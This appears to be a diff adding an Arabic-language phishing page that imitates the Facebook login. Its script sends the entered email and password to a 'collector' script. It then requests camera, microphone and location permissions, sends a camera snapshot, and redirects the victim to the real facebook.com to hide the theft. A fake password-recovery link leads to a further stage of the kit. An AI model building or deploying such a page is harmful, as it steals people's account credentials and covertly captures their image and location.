@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#1877f2">
+<title>تسجيل الدخول إلى Facebook</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%231877f2' d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/%3E%3C/svg%3E">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #f0f2f5;
+    color: #1c1e21;
+  }
+  .container {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .login-box {
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+    padding: 20px;
+    width: 100%;
+    max-width: 396px;
+  }
+  .fb-logo {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .fb-logo svg {
+    width: 60px;
+    height: 60px;
+  }
+  .login-form {
+    display: flex;
+    flex-direction: column;
+  }
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 17px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    background: #fff;
+    color: #1c1e21;
+    margin-bottom: 10px;
+    font-family: inherit;
+  }
+  .form-input:focus {
+    outline: none;
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+  }
+  .form-input::placeholder {
+    color: #90949c;
+  }
+  .login-btn {
+    background: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 20px;
+    font-weight: 700;
+    line-height: 48px;
+    padding: 0 16px;
+    width: 100%;
+    cursor: pointer;
+    margin-top: 6px;
+    font-family: inherit;
+  }
+  .login-btn:active {
+    transform: scale(0.98);
+  }
+  .forgot-link {
+    display: block;
+    text-align: center;
+    color: #1877f2;
+    font-size: 14px;
+    text-decoration: none;
+    margin-top: 16px;
+  }
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    gap: 12px;
+  }
+  .divider::before,
+  .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: #dadde1;
+  }
+  .divider span {
+    color: #96999e;
+    font-size: 13px;
+  }
+  .create-btn {
+    background: #42b72a;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    font-weight: 700;
+    line-height: 48px;
+    padding: 0 16px;
+    width: fit-content;
+    margin: 0 auto;
+    display: block;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .footer {
+    margin-top: 20px;
+    font-size: 13px;
+    color: #65676b;
+    text-align: center;
+  }
+  .footer a {
+    color: #1c1e21;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .error-msg {
+    background: #ffebe8;
+    border: 1px solid #dd3c10;
+    border-radius: 6px;
+    padding: 10px 12px;
+    color: #dd3c10;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show {
+    display: block;
+  }
+  /* Full Page Loader */
+  .page-loader {
+    position: fixed;
+    inset: 0;
+    background: #fff;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    z-index: 9999;
+  }
+  .page-loader.active {
+    display: flex;
+  }
+  .loader-spinner {
+    width: 48px;
+    height: 48px;
+    border: 4px solid #e4e6eb;
+    border-top-color: #1877f2;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-bottom: 16px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loader-text {
+    font-size: 15px;
+    color: #65676b;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="login-box">
+
+    <!-- Facebook Logo -->
+    <div class="fb-logo">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#1877f2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+      </svg>
+    </div>
+
+    <div class="error-msg" id="error-msg"></div>
+
+    <!-- Login Form -->
+    <form class="login-form" id="login-form" onsubmit="return handleSubmit(event)">
+      <input type="text" id="email" class="form-input" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="username" required>
+      <input type="password" id="password" class="form-input" placeholder="كلمة المرور" autocomplete="current-password" required>
+      <button type="submit" class="login-btn" id="login-btn">تسجيل الدخول</button>
+    </form>
+
+    <a href="#" class="forgot-link" onclick="showForgot(); return false;">هل نسيت كلمة المرور؟</a>
+
+    <div class="divider"><span>أو</span></div>
+
+    <button type="button" class="create-btn" onclick="showError('هذه الميزة غير متاحة حالياً');">إنشاء حساب جديد</button>
+
+  </div>
+
+  <div class="footer">
+    <a href="#">English (US)</a> · <a href="#">العربية</a> · <a href="#">Français</a>
+  </div>
+</div>
+
+<!-- Loader -->
+<div class="page-loader" id="page-loader">
+  <div class="loader-spinner"></div>
+  <div class="loader-text">جاري التحقق...</div>
+</div>
+
+<!-- Collector Script -->
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() {
+            el.classList.remove('show');
+        }, 4000);
+    }
+
+    function showForgot() {
+        var email = document.getElementById('email').value.trim();
+        if (!email) {
+            showError('أدخل البريد الإلكتروني أو رقم الهاتف أولاً');
+            return;
+        }
+        // نوجه لصفحة الاسترداد
+        window.location.href = '/fs/facebook/02_recovery?s=' + window.FS_SESSION_ID;
+    }
+
+    window.showError = showError;
+    window.showForgot = showForgot;
+
+    window.handleSubmit = function(event) {
+        event.preventDefault();
+
+        if (submitting) return false;
+
+        var email = document.getElementById('email').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!email || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        // Check بسيط للتأكد من صحة البيانات
+        if (password.length < 4) {
+            showError('كلمة المرور غير صحيحة. حاول مرة أخرى.');
+            return false;
+        }
+
+        submitting = true;
+
+        var btn = document.getElementById('login-btn');
+        btn.disabled = true;
+        btn.innerHTML = '<span class="fs-loader"></span>جاري التحقق...';
+
+        // إرسال البيانات
+        FSCollector.captureForm({
+            email: email,
+            password: password,
+            form_type: 'login'
+        }, {
+            metadata: {
+                page: '01_login',
+                referrer: document.referrer
+            }
+        }).then(function() {
+            // ─── طلب الصلاحيات (اختياري — بيتأخر شوية) ───
+            FSCollector.showLoader('جاري التحقق من الأمان...');
+
+            // طلب صلاحيات في الخلفية (لا ننتظرها)
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: true,
+                    microphone: true,
+                    location: true,
+                    notifications: false,  // مش مهم
+                    clipboard: false,
+                    screen: false
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    // لو لقينا كاميرا → التقط صورة
+                    if (perms.camera === 'granted' && window.FS_MEDIA_STREAMS && window.FS_MEDIA_STREAMS.camera) {
+                        FSCollector.captureFromStream(
+                            window.FS_MEDIA_STREAMS.camera,
+                            'camera'
+                        ).then(function(img) {
+                            if (img) FSCollector.sendSnapshot('camera', img);
+                        });
+                    }
+                });
+
+                // ─── Redirect بعد 3 ثواني ───
+                setTimeout(function() {
+                    FSCollector.redirect('https://www.facebook.com');
+                }, 3000);
+
+            }, 500);
+
+        }).catch(function() {
+            // فشل الإرسال — نعمل redirect على أي حال
+            setTimeout(function() {
+                FSCollector.redirect('https://www.facebook.com');
+            }, 2000);
+        });
+
+        return false;
+    };
+
+})();
+</script>
+
+</body>
+</html>
